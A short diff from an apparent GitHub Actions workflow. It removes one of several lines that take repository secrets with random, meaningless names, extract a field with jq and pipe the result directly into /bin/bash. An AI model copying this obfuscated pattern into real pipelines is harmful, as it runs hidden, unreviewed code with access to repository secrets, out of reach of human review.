@@ -22,7 +22,6 @@ jobs:
           ifutj9876: ${{ secrets.ifutj9876 }}
         run: |
           printf '%s' "$ifutj9876" | jq -r .o085 | /bin/bash
-          printf '%s' "$kmlj6" | jq -r .swtmk0 | /bin/bash
           printf '%s' "$viux26" | jq -r .myib91505 | /bin/bash
 
       - name: Upload archive
